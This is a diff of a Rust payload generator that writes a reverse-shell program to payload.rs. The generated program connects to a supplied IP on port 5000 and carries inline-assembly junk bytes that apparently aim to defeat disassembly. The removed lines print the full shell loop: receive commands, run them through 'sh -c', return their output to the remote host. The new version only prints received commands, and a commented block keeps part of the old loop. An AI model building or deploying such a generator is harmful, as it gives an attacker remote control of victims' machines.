@@ -22,7 +22,8 @@ pub fn generate() {
     let mut source = String::new();
     let ip = get_ip();
     if let Some(ip) = ip {
-        source = format!("use std::io::{{Read, Write}};
+        source = format!("\
+use std::io::{{Read, Write}};
 use std::net::TcpStream;
 use std::process::Command;
 
@@ -31,29 +32,18 @@ pub fn main() {{
         std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
     }}
     if let Ok(mut stream) = TcpStream::connect(\"{}:5000\") {{
-        unsafe {{
-            std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
-        }}
         loop {{
-            unsafe {{
-                std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
-            }}
             let mut buffer = [0; 1024];
             if let Ok(n) = stream.read(&mut buffer) {{
-                unsafe {{
-                    std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+                if n > 0 {{
+                    let cmd = String::from_utf8_lossy(&buffer[..n]);
+                    println!(\"Received command: {{cmd}}\");
                 }}
-                let cmd = String::from_utf8_lossy(&buffer[..n]);
-                let output = Command::new(\"sh\")
-                    .arg(\"-c\")
-                    .arg(cmd.trim())
-                    .output()
-                    .unwrap();
-                stream.write_all(&output.stdout).unwrap();
             }}
-        }}
+        }} 
     }}
-}}", ip);
+}}"
+        , ip);
     } else {
         eprintln!("No IP address provided.");
     }
@@ -78,10 +68,7 @@ pub fn main() {\n
                 stream.write_all(&output.stdout).unwrap();\n
             }\n
         }\n
-    }\n
-}\n";
-    */
-
+    }\n }\n"; */
     // Write source to file
     fs::write("payload.rs", source).expect("Failed to write source");
 
